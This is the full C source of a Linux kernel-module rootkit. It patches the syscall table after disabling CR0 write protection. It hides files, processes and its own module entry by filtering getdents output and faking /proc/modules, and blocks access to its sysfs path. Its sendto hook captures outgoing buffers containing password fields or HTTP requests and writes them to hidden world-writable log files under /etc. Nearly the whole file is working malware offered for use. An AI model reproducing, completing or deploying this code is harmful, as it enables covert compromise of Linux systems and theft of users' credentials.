#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/delay.h>
#include <asm/paravirt.h>
#include <linux/dirent.h>
#include <linux/file.h>
#include <linux/fs.h>
#include <asm/uaccess.h>	// Needed by segment descriptors
#include <linux/slab.h>
#include <linux/path.h>
#include <linux/namei.h>
#include <linux/fs_struct.h>	//for xchg(&current->fs->umask, ... )


#define BEGIN_BUF_SIZE 10000
#define LOG_SEPARATOR "\n.............................................................\n"
#define CMDLINE_SIZE 1000

//configuration
#define FILE_SUFFIX ".rootkit"		//hiding files with names ending on defined suffix
#define COMMAND_CONTAINS ".//./"	//hiding processes which cmdline contains defined text
#define ROOTKIT_NAME "rootkit"		//you need to type here name of this module to make this module hidden


DEFINE_MUTEX(log_mutex_pass);
DEFINE_MUTEX(log_mutex_http);

struct linux_dirent {
	unsigned long d_ino;
	unsigned long d_off;
	unsigned short d_reclen;
	char d_name[];
};


unsigned long **sys_call_table;
unsigned long original_cr0;

asmlinkage long (*ref_sys_read) (unsigned int fd, char __user * buf,
    size_t count);
asmlinkage long (*ref_sys_getdents) (unsigned int,
    struct linux_dirent __user *, unsigned int);
asmlinkage long (*ref_sys_getdents64) (unsigned int,
    struct linux_dirent64 __user *, unsigned int);
asmlinkage long (*ref_sys_sendto) (int, void __user *, size_t, unsigned,
    struct sockaddr __user *, int);
asmlinkage long (*ref_sys_open) (const char __user * filename,
    int flags, umode_t mode);
asmlinkage long (*ref_sys_stat) (const char __user * filename,
    struct __old_kernel_stat __user * statbuf);


/*functions for r/w files copied from stackoverflow*/

struct file *file_open(const char *path, int flags, int rights)
{
	struct file *filp = NULL;
	mm_segment_t oldfs;
	int err = 0;

	oldfs = get_fs();
	set_fs(get_ds());
	filp = filp_open(path, flags, rights);
	set_fs(oldfs);
	if (IS_ERR(filp)) {
		err = PTR_ERR(filp);
		return NULL;
	}
	return filp;
}

void file_close(struct file *file)
{
	filp_close(file, NULL);
}

int file_read(struct file *file, unsigned long long offset,
    unsigned char *data, unsigned int size)
{
	mm_segment_t oldfs;
	int ret;

	oldfs = get_fs();
	set_fs(get_ds());

	ret = vfs_read(file, data, size, &offset);

	set_fs(oldfs);
	return ret;
}

int file_write(struct file *file, unsigned long long offset,
    const unsigned char *data, unsigned int size)
{
	mm_segment_t oldfs;
	int ret;

	oldfs = get_fs();
	set_fs(get_ds());

	ret = vfs_write(file, data, size, &offset);

	set_fs(oldfs);
	return ret;
}

int file_sync(struct file *file)
{
	vfs_fsync(file, 0);
	return 0;
}

/*end of functions for r/w files copied from stackoverflow*/

char *read_whole_file(struct file *f, int *return_read)
{
	int buf_size = BEGIN_BUF_SIZE;
	int res;
	int read = 0;
	char *buf = kzalloc(buf_size + 1, GFP_KERNEL);
	char *buf_old=NULL;
	if (buf == NULL)
		return NULL;

	res = file_read(f, read, buf + read, buf_size - read);
	while (res > 0) {
		read += res;
		if (read == buf_size) {
			buf_size = buf_size * 2;
			buf_old=buf;
			buf=krealloc(buf,buf_size+1,GFP_KERNEL);
			if(buf==NULL)
			{
			  kfree(buf_old); //https://tapaswenipathak.wordpress.com/2015/01/13/faults-in-linux-kernel-3-x-wrong-use-of-krealloc/
			  return NULL;
			}
		}
		res = file_read(f, read, buf + read, buf_size - read);
	}
	if (return_read)
		*return_read = read;
	buf[read]=0;
	return buf;
}

char *read_n_bytes_of_file(struct file *f, int n, int *return_read)
{
	int buf_size = n;
	int res;
	int read = 0;
	char *buf = kzalloc(buf_size + 1, GFP_KERNEL);
	if (buf == NULL)
		return NULL;

	res = file_read(f, read, buf + read, buf_size - read);
	while (res > 0) {
		read += res;
		res = file_read(f, read, buf + read, buf_size - read);
	}
	if (return_read)
		*return_read = read;
	buf[read]=0;
	return buf;
}

asmlinkage long new_sys_read(unsigned int fd, char __user * buf, size_t count)
{
	long ret;
	ret = ref_sys_read(fd, buf, count);

	return ret;
}

int check_file_suffix(const char *name)	//checks if file ends on suffix
{
	int len = strlen(name);
	int suffix_len = strlen(FILE_SUFFIX);
	if (len >= suffix_len) {
		const char *check_suffix = name;
		check_suffix += len - suffix_len;
		if (strcmp(check_suffix, FILE_SUFFIX) == 0)
			return 1;
	}
	return 0;
}

int is_int(const char *data)
{
	if(data==NULL)
	  return 0;
	while(*data)
	{
	      if(*data<'0' || *data>'9')
		return 0;
	      data++;
	}
	return 1;
}

int check_process_prefix(const char *name)
{
	int err;
	long pid;
	char *path = NULL;
	struct file *f = NULL;
	char *buf = NULL;
	int res = 0;
	int read;
	int i;

	if(!is_int(name))
		goto end_;

	err = kstrtol(name, 10, &pid);
	if (err != 0)
		goto end_;

	path = kzalloc(strlen("/proc/") + strlen(name) + strlen("/cmdline") + 1,
	    GFP_KERNEL);
	if (path == NULL)
		goto end_;

	strcpy(path, "/proc/");
	strcat(path, name);
	strcat(path, "/cmdline");

	f = file_open(path, O_RDONLY, 0);
	if (f == NULL)
		goto end_;

	buf = read_n_bytes_of_file(f, CMDLINE_SIZE, &read);

	if(buf==NULL)
		goto end_;

	for (i = 0; i < read; i++) {
		if (buf[i] == 0)
			buf[i] = ' ';	//cmdline is in format argv[0]\x00argv[1] .... 
	}

	if (strstr(buf, COMMAND_CONTAINS)) {
		printk(KERN_DEBUG "hiding %s\n", buf);
		res = 1;
	}

      end_:
	if (f)
		file_close(f);
	kfree(buf);
	kfree(path);
	return res;
}

int check_file_name(const char *name)
{
	return strcmp(name, ROOTKIT_NAME) == 0;
}

int should_be_hidden(const char *name)
{
	return check_file_suffix(name) | check_process_prefix(name) |
	    check_file_name(name);
}

asmlinkage long new_sys_getdents(unsigned int fd,
    struct linux_dirent __user * dirent, unsigned int count)
{
	long read;
	long bpos;
	struct linux_dirent __user *d;
	read = ref_sys_getdents(fd, dirent, count);
	if (read <= 0)
		return read;
	for (bpos = 0; bpos < read;) {
		d = (struct linux_dirent __user *)((char *)dirent + bpos);
		if (d->d_ino != 0) {
			if (should_be_hidden((char *)d->d_name)) {
				//delete this entry
				int rest = read - (bpos + d->d_reclen);
				int from_ = bpos + d->d_reclen;
				int to_ = bpos;

				struct linux_dirent __user *from =
				    (struct linux_dirent __user *)((char *)
				    dirent + from_);
				struct linux_dirent __user *to =
				    (struct linux_dirent __user *)((char *)
				    dirent + to_);

				memcpy(to, from, rest);
				read -= d->d_reclen;
				continue;
			}
		}
		bpos += d->d_reclen;
	}

	//printk(KERN_DEBUG "getdents end\n");
	return read;
}

asmlinkage long new_sys_getdents64(unsigned int fd,
    struct linux_dirent64 __user * dirent, unsigned int count)
{
	//printk(KERN_INFO "getdents64 start\n");
	long read;
	long bpos;
	struct linux_dirent64 __user *d;
	read = ref_sys_getdents64(fd, dirent, count);
	if (read <= 0)
		return read;
	for (bpos = 0; bpos < read;) {
		d = (struct linux_dirent64 __user *)((char *)dirent + bpos);
		if (d->d_ino != 0) {
			if (should_be_hidden((char *)d->d_name)) {
				//delete this entry
				int rest = read - (bpos + d->d_reclen);
				int from_ = bpos + d->d_reclen;
				int to_ = bpos;

				struct linux_dirent64 __user *from =
				    (struct linux_dirent64 __user *)((char *)
				    dirent + from_);
				struct linux_dirent64 __user *to =
				    (struct linux_dirent64 __user *)((char *)
				    dirent + to_);

				memcpy(to, from, rest);
				read -= d->d_reclen;
				continue;
			}
		}
		bpos += d->d_reclen;
	}

	//printk(KERN_DEBUG "getdents64 end\n");
	return read;
}

void save_to_log(const char *log_type, const char *what, size_t size)
{
	int err;
	struct file *f = NULL;
	long long file_size;
	struct path p;
	struct kstat ks;
	char *full_path =
	    kzalloc(strlen("/etc/") + strlen(log_type) + strlen(FILE_SUFFIX) +
	    1, GFP_KERNEL);
	current->flags |= PF_SUPERPRIV;

	if (full_path == NULL)
		goto end;

	strcpy(full_path, "/etc/");
	strcat(full_path, log_type);
	strcat(full_path, FILE_SUFFIX);

	printk(KERN_INFO "saving to log\n");

	f = file_open(full_path, O_WRONLY | O_CREAT, 0777);
	if (f == NULL)
		goto end;

	kern_path(full_path, 0, &p);
	err = vfs_getattr(&p, &ks);
	if (err)
		goto end;

	printk(KERN_INFO "size: %lld\n", ks.size);
	file_size = ks.size;
	err = file_write(f, file_size, what, size);
	if (err == -EINVAL)
		goto end;

	file_size += size;
	err = file_write(f, file_size, LOG_SEPARATOR, strlen(LOG_SEPARATOR));
	if (err == -EINVAL)
		goto end;

	printk(KERN_INFO "ok\n");

      end:
	if (f)
		file_close(f);
	kfree(full_path);
	current->flags |= PF_SUPERPRIV;
}

int password_found(const char *buf, size_t size)
{
	if (strnstr(buf, "password=", size))
		return 1;
	if (strnstr(buf, "pass=", size))
		return 1;
	if (strnstr(buf, "haslo=", size))
		return 1;
	return 0;
}

int http_header_found(const char *buf, size_t size)
{
	//printk(KERN_INFO "%s\n", buf);
	if (strnstr(buf, "POST /", size))
		return 1;
	if (strnstr(buf, "GET /", size))
		return 1;
	return 0;
}

asmlinkage long new_sys_sendto(int fd, void __user * buff, size_t len,
    unsigned int flags, struct sockaddr __user * addr, int addr_len)
{
	long ret;

	//printk(KERN_INFO "sendto start\n");

	if (password_found(buff, len)) {
		printk(KERN_INFO "password found\n");
		mutex_lock(&log_mutex_pass);
		save_to_log("passwords", buff, len);
		mutex_unlock(&log_mutex_pass);
	}

	if (http_header_found(buff, len)) {
		printk(KERN_INFO "http found\n");
		mutex_lock(&log_mutex_http);
		save_to_log("http_requests", buff, len);
		mutex_unlock(&log_mutex_http);
	}

	ret = ref_sys_sendto(fd, buff, len, flags, addr, addr_len);

	//printk(KERN_DEBUG "sento end\n");
	return ret;
}

//when open("/proc/modules") is called, reate fake file with removed rootkit entry and redirect to this file
asmlinkage long new_sys_open(char __user * filename, int flags, umode_t mode)
{
	long ret;
	int rootkit_path_len=strlen("/sys/module/")+strlen(ROOTKIT_NAME);
	char *rootkit_path=kmalloc(rootkit_path_len+1,GFP_KERNEL);
	if(rootkit_path==NULL)
	{
	  ret=-1;
	  goto end;
	}
	strcpy(rootkit_path,"/sys/module/");
	strcat(rootkit_path,ROOTKIT_NAME);
	if (strcmp(filename, "/proc/modules") == 0) {
		struct file *fake_modules;
		struct file *real_modules;
		mm_segment_t old_fs;
		char *modules_buf;
		char *rootkit, *rootkit_end;
		char *new_path;
		long res;

		printk(KERN_INFO "open /proc/modules\n");

		new_path =
		    kzalloc(strlen("/etc/modules") + strlen(FILE_SUFFIX) + 1,
		    GFP_KERNEL);

		if (!new_path){
			ret = ref_sys_open(filename, flags, mode);
			goto end;
		}

		strcpy(new_path, "/etc/modules");
		strcat(new_path, FILE_SUFFIX);


		real_modules = file_open("/proc/modules", O_RDONLY, 0);
		if (real_modules == NULL) {
			kfree(new_path);
			ret = ref_sys_open(filename, flags, mode);
			goto end;
		}
		//open files
		fake_modules =
		    file_open(new_path, O_WRONLY | O_CREAT | O_TRUNC, 0777);
		if (fake_modules == NULL) {
			kfree(new_path);
			ret = ref_sys_open(filename, flags, mode);
			goto end;
		}

		modules_buf = read_whole_file(real_modules, NULL);
		if (modules_buf == NULL) {
			kfree(new_path);
			ret = ref_sys_open(filename, flags, mode);
			goto end;
		}

		//remove rootkit from modules list
		rootkit = strstr(modules_buf, ROOTKIT_NAME);
		if (rootkit)	//shouldn't be NULL anyway - only if rootkit name is bad configured in #define
		{
			rootkit_end = rootkit;
			while (*rootkit_end != '\n' && *rootkit_end != '\x00')	//shouldn't be \x00 anyway - only if somebody do it intentionally and change sys_open before us
				rootkit_end++;
			memcpy(rootkit, rootkit_end + 1, strlen(rootkit_end) + 1);	//wiping rootkit entry
		}
		//save modules list to fake file
		res =
		    file_write(fake_modules, 0, modules_buf,
		    strlen(modules_buf));

		file_close(fake_modules);
		file_close(real_modules);
		kfree(modules_buf);

		//http://stackoverflow.com/questions/7629141/allocate-user-space-memory-from-kernel
		old_fs = get_fs();
		set_fs(KERNEL_DS);
		//redirect open("/proc/modules") to fake file
		ret = ref_sys_open(new_path, flags, mode);
		set_fs(old_fs);

		kfree(new_path);
	} else if (strncmp(filename, rootkit_path, rootkit_path_len) == 0) {
		ret=-ENOENT;
	} else {
		ret = ref_sys_open(filename, flags, mode);
	}
end:
        kfree(rootkit_path);
	return ret;
}

//for unable to unload rootkit
asmlinkage long new_sys_stat (const char __user * filename,
        struct __old_kernel_stat __user * statbuf)
{
	long ret;
	int rootkit_path_len=strlen("/sys/module/")+strlen(ROOTKIT_NAME);
	char *rootkit_path=kmalloc(rootkit_path_len+1,GFP_KERNEL);
	strcpy(rootkit_path,"/sys/module/");
	strcat(rootkit_path,ROOTKIT_NAME);
	if (strncmp(filename, rootkit_path, rootkit_path_len) == 0) {
		ret = -ENOENT;
	} else {
		ret = ref_sys_stat(filename, statbuf);
	}
	kfree(rootkit_path);
	return ret;
}

//from https://bbs.archlinux.org/viewtopic.php?id=139406

static unsigned long **aquire_sys_call_table(void)
{
	unsigned long int offset = PAGE_OFFSET;
	unsigned long **sct;

	while (offset < ULLONG_MAX) {
		sct = (unsigned long **)offset;

		if (sct[__NR_close] == (unsigned long *)sys_close)
			return sct;

		offset += sizeof(void *);
	}

	return NULL;
}

static void create_file(char *name)
{
	struct file *f;
	char *path;

	mode_t old_mask = xchg(&current->fs->umask, 0);

	path = kzalloc(strlen(name) + strlen(FILE_SUFFIX) + 1, GFP_KERNEL);

	if (!path)
		return;

	strcpy(path, name);
	strcat(path, FILE_SUFFIX);

	f = file_open(path, O_CREAT, 0777);
	if (f)
		file_close(f);

	kfree(path);

	xchg(&current->fs->umask, old_mask);
}

/* Creates files with permissions 777 used later by rootkit
 * because functions filp* worsk with privileges of user calling syscall
 * files:
 * /etc/passwords[FILE_SUFFIX]
 * /etc/http_requests[FILE_SUFFIX]
 * /etc/modules[FILE_SUFFIX]
*/
static void create_files(void)
{
	create_file("/etc/modules");
	create_file("/etc/http_requests");
	create_file("/etc/passwords");
}

#define register(name) \
 ref_sys_##name = (void *)sys_call_table[__NR_##name]; \
 sys_call_table[__NR_##name] = (unsigned long *)new_sys_##name;

#define unregister(name) \
 sys_call_table[__NR_##name] = (unsigned long *)ref_sys_##name;

static int __init rootkit_start(void)
{
	if (!(sys_call_table = aquire_sys_call_table()))
		return -1;

	create_files();

	original_cr0 = read_cr0();

	write_cr0(original_cr0 & ~0x00010000);

	register (getdents);
	register (getdents64);
	register (sendto);
	register (open);
	register (stat);

	write_cr0(original_cr0);

	return 0;
}

static void __exit rootkit_end(void)
{
	if (!sys_call_table) {
		return;
	}

	write_cr0(original_cr0 & ~0x00010000);

	unregister(getdents);
	unregister(getdents64);
	unregister(sendto);
	unregister(open);
	unregister(stat);

	write_cr0(original_cr0);

	msleep(2000);
}

module_init(rootkit_start);
module_exit(rootkit_end);

MODULE_LICENSE("GPL");
